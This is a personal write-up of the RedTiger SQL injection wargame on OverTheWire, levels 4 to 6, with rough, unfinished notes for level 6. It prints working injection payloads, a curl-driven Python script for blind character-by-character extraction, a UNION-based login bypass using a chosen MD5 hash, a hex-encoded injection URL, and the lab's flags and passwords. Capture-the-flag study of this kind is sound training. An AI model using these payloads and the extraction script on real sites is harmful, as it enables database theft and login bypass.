## Level 4

**URL:** https://redtiger.labs.overthewire.org/level4.php
**Target:** Get the value of the first entry in table level4_secret in column keyword
**Disabled:** like

<img src="C:\Users\royo\AppData\Roaming\Typora\typora-user-images\image-20200502160745271.png" alt="image-20200502160745271" style="border:1px solid black;" />

Clicking on "Click me" sent the value 1 to the parameter `id`, presenting "Query returned 1 rows.":

<img src="C:\Users\royo\AppData\Roaming\Typora\typora-user-images\image-20200502161058260.png" alt="image-20200502161058260" style="border:1px solid black;" />

<center> ?id=1



Sending the parameter 0 presented "Query returned 1 rows.":

<img src="C:\Users\royo\AppData\Roaming\Typora\typora-user-images\image-20200502161248110.png" alt="image-20200502161248110" style="border:1px solid black;" />

<center>?id=0



I wrote down the possible SQL query, where `[id]` can be defined by me. I figured that the page presents the number of rows selected by this query:

```sql
SELECT ?,?,...  
FROM table_name 
WHERE id = [id];
```

I sent the value `0 OR ''=''` to perform the following query and get the number of rows in the table with the column "id":

```sql
SELECT ?,?,... 
FROM table_name 
WHERE id = 0 OR ''='';
```

The page presented "Query returned 1 rows.":

<img src="C:\Users\royo\AppData\Roaming\Typora\typora-user-images\image-20200502161817257.png" alt="image-20200502161817257" style="border:1px solid black;" />

<center> ?id=0%20OR%20%27%27=%27%27



I sent the value `0 UNION SELECT keyword FROM level4_secret` to perform the following query and get the number of rows in the table "level4_secret":

```sql
SELECT ?,?,...
FROM table_name 
WHERE id = 0 
UNION 
SELECT keyword 
FROM level4_secret;
```

<img src="C:\Users\royo\AppData\Roaming\Typora\typora-user-images\image-20200502162757617.png" alt="image-20200502162757617" style="border:1px solid black;" />

<center> ?id=0%20UNION%20SELECT%20keyword%20FROM%20level4_secret



I tried adding another column to the selection by sending `0 UNION SELECT keyword,2 FROM level4_secret`:

```sql
SELECT ?,?,... 
FROM table_name 
WHERE id = 0 
UNION 
SELECT keyword,2 
FROM level4_secret;
```

<img src="C:\Users\royo\AppData\Roaming\Typora\typora-user-images\image-20200502163019115.png" alt="image-20200502163019115" style="border:1px solid black;" />

<center>?id=0%20UNION%20SELECT%20keyword,2%20FROM%20level4_secret



Seems like the table has 2 columns. Since we do not have access to the values in the table (but only to the number of rows selected), I decided to perform a blind SQL injection. I used he `LEFT` function to figure the first character. To go over all possible characters, I wrote a short Python script on Jupyter:

```python
import string

# Get the cookie for level 4
foo = ! curl --silent --cookie-jar level4login --cookie level4login --request POST --data "password=put_the_kitten_on_your_head&level4login=Login" https://redtiger.labs.overthewire.org/level4.php

chars = list(string.ascii_lowercase + string.digits) # possible characters

for char in chars:
    print("response for %s:" %char, end = "")
    ! curl --silent --cookie level4login "https://redtiger.labs.overthewire.org/level4.php?id=0%20UNION%20SELECT%20keyword,id%20FROM%20level4_secret%20WHERE%20LEFT(keyword,1)%20=%20%27{char}%27" | findstr "Query returned"
```

Output:

```
response for a:	Query returned 0 rows. <br /><br />
response for b:	Query returned 0 rows. <br /><br />
response for c:	Query returned 0 rows. <br /><br />
response for d:	Query returned 0 rows. <br /><br />
response for e:	Query returned 0 rows. <br /><br />
response for f:	Query returned 0 rows. <br /><br />
response for g:	Query returned 0 rows. <br /><br />
response for h:	Query returned 0 rows. <br /><br />
response for i:	Query returned 0 rows. <br /><br />
response for j:	Query returned 0 rows. <br /><br />
response for k:	Query returned 1 rows. <br /><br />
response for l:	Query returned 0 rows. <br /><br />
response for m:	Query returned 0 rows. <br /><br />
response for n:	Query returned 0 rows. <br /><br />
response for o:	Query returned 0 rows. <br /><br />
response for p:	Query returned 0 rows. <br /><br />
response for q:	Query returned 0 rows. <br /><br />
response for r:	Query returned 0 rows. <br /><br />
response for s:	Query returned 0 rows. <br /><br />
response for t:	Query returned 0 rows. <br /><br />
response for u:	Query returned 0 rows. <br /><br />
response for v:	Query returned 0 rows. <br /><br />
response for w:	Query returned 0 rows. <br /><br />
response for x:	Query returned 0 rows. <br /><br />
response for y:	Query returned 0 rows. <br /><br />
response for z:	Query returned 0 rows. <br /><br />
response for 0:	Query returned 0 rows. <br /><br />
response for 1:	Query returned 0 rows. <br /><br />
response for 2:	Query returned 0 rows. <br /><br />
response for 3:	Query returned 0 rows. <br /><br />
response for 4:	Query returned 0 rows. <br /><br />
response for 5:	Query returned 0 rows. <br /><br />
response for 6:	Query returned 0 rows. <br /><br />
response for 7:	Query returned 0 rows. <br /><br />
response for 8:	Query returned 0 rows. <br /><br />
response for 9:	Query returned 0 rows. <br /><br />
```

The output indicates that the first character is "k", since this is the only option for which the query returned any rows. Based on that PoC, I added a few changes to get the full keyword:

```python
import string

def is_right_char(char,index):
    response = ! curl --silent --cookie level4login "https://redtiger.labs.overthewire.org/level4.php?id=0%20UNION%20SELECT%20keyword,id%20FROM%20level4_secret%20WHERE%20SUBSTRING(keyword,{currentindex},1)%20=%20%27{char}%27" | findstr "Query returned"
    response = response[0].split()[2]
    return response == '1'

# Get the cookie for level 4
foo = ! curl --silent --cookie-jar level4login --cookie level4login --request POST --data "password=put_the_kitten_on_your_head&level4login=Login" https://redtiger.labs.overthewire.org/level4.php
    
chars = list(string.ascii_lowercase + string.digits + "?!@#$%^&*") # possible characters
currentindex=1 # the index we are trying to solve now. starting from first one
stop = False

while (stop == False): # stop running when no character is the right one (reached to end of keyword)
    stop = True
    for char in chars:
        if (is_right_char(char,currentindex)): 
            print(char,end = "") # print only the right chars, on the same line
            stop = False
            break
    currentindex += 1
```

Output:

```
killstickswithbr1cks!
```

I used the keyword and received the flag (**e8bcb79c389f5e295bac81fda9fd7cfa**) and the password for Level 5 (**this_hack_it's_old**):

<img src="C:\Users\royo\AppData\Roaming\Typora\typora-user-images\image-20200502165957952.png" alt="image-20200502165957952" style="border:1px solid black;" />



## Level 5

**URL:** https://redtiger.labs.overthewire.org/level5.php
**Target:** Bypass the login
**Disabled:** substring , substr, ( , ), mid
**Hints:** its not a blind, the password is md5-crypted, watch the login errors

<img src="C:\Users\royo\AppData\Roaming\Typora\typora-user-images\image-20200502194527333.png" alt="image-20200502194527333" style="border:1px solid black;" />



Below are the values I tried and the insights I made from them:

* Try 1

  * **Username:** ` ` (NULL)
  * **Password:** ` ` (NULL)
  * **Message:** `Empty password or username`

* Try 2

  * **Username:** `aaa`
  * **Password:** `aaa`
  * **Message:** `User not found!`

* Try 3

  * **Username:** `'`
  * **Password:** `aaa`
  * **Message:** `Warning: mysql_num_rows() expects parameter 1 to be resource, boolean given in /var/www/html/hackit/level5.php on line **46**    User not found!`

* Try 4

  * **Username:** `aaa`
  * **Password:** `'`
  * **Message:** `User not found!`
  * The lase 2 tries, together with Try#1, made me believe that the form checks for empty values at the moment of submitting, and before the SQL query. This means that selecting empty strings in the query should be ok as long as the form's fields are not empty.

* Try 5

  * **Username:** `' OR ''='`

  * **Password:** `' OR ''='`

  * **Message:** `Login failed!`

  * That was the first time I received a "Login failed!" error instead of "User not found!". This means that I managed to take care of the username, and should now focus on getting the password right. From the fact that the password did not response the same way, I suspected the query might look similar to this:

    ```mysql
    SELECT username, hashedpassword 
    FROM tablename 
    WHERE username = '[username]' AND hashedpassword = MD5('[password]');
    ```

* Try 6

  * **Username:** `' OR ''='`
  * **Password:** `') OR ''=''--`
  * **Message:** `Login failed!`
  * From this try I suspect that the md5 encryption is being done before the SQL query and not inside it, and that the comparison between the password in the DB to the one entered by the user is being done after the query.
  * This gave me the idea to make sure that a certain hashed string will be selected (even if not in the database) before comparing it to the one entered by the user. For that I used [md5decrypt.net]() to encrypt the phrase "password" into md5 (**5f4dcc3b5aa765d61d8327deb882cf99**), and used the `UNION` function to add this hash to the selected data.

* Try 7

  * **Username:** `' UNION SELECT '5f4dcc3b5aa765d61d8327deb882cf99', '5f4dcc3b5aa765d61d8327deb882cf99`
  * **Password:** `password`
  * **Message:** `Login successful!`



I received the flag (**ca5c3c4f0bc85af1392aef35fc1d09b3**) and the password for Level 5 (**the_stone_is_cold**):

<img src="C:\Users\royo\AppData\Roaming\Typora\typora-user-images\image-20200502203040861.png" alt="image-20200502203040861" style="border:1px solid black;" />



## Level 6

**URL:** https://redtiger.labs.overthewire.org/level6.php
**Target:** Get the first user in table level6_users with status 1

<img src="C:\Users\royo\AppData\Roaming\Typora\typora-user-images\image-20200502203406312.png" alt="image-20200502203406312" style="border:1px solid black;" />



```sql
SELECT username, email,3,4,5 
FROM level6_users 
WHERE user = 0 OR status = 1;
```

This is how I figured that admin is the first one with that status

<img src="C:\Users\royo\AppData\Roaming\Typora\typora-user-images\image-20200502204742351.png" alt="image-20200502204742351" style="border:1px solid black;" />

<center>?user=0%20OR%20status%20=%201%20LIMIT%201



```sql
SELECT id,,,, 
FROM level6_users 
WHERE id = 0 OR id = admin;




columns I know we have:

1. id (what we give at "user"): 1,2,3,4,5
2. username
3. password
4. 
5. status

password
username:admin,...

status


id is the first column!! proof: (first shows deddlef, second shows nothing cause the id was changed and is not identical now)

https://redtiger.labs.overthewire.org/level6.php?user=1%20UNION%20SELECT%201,2,3,4,5%20FROM%20level6_users%20ORDER%20BY%20id%20DESC

https://redtiger.labs.overthewire.org/level6.php?user=1%20UNION%20SELECT%201,2,3,4,5%20FROM%20level6_users%20ORDER%20BY%20id%20DESC


status is the last (5th) column!!

https://redtiger.labs.overthewire.org/level6.php?user=1%20UNION%20SELECT%209,9,9,9,-2%20FROM%20level6_users%20ORDER%20BY%20status%20asc


password is 3rd!


username is second



SELECT username,email FROM level6_users WHERE username='' UNION SELECT password,password,password,password,password FROM level6_users WHERE username='admin';

```

my solution:

[https://redtiger.labs.overthewire.org/level6.php?user=0%20union%20select%201,0x2720554e494f4e2053454c4543542070617373776f72642c70617373776f72642c70617373776f72642c70617373776f72642c70617373776f72642046524f4d206c6576656c365f757365727320574845524520757365726e616d653d2761646d696e,3,4,5%20FROM%20level6_users](https://redtiger.labs.overthewire.org/level6.php?user=0 union select 1,0x2720554e494f4e2053454c4543542070617373776f72642c70617373776f72642c70617373776f72642c70617373776f72642c70617373776f72642046524f4d206c6576656c365f757365727320574845524520757365726e616d653d2761646d696e,3,4,5 FROM level6_users)



pass: **shitcoins_are_hold**
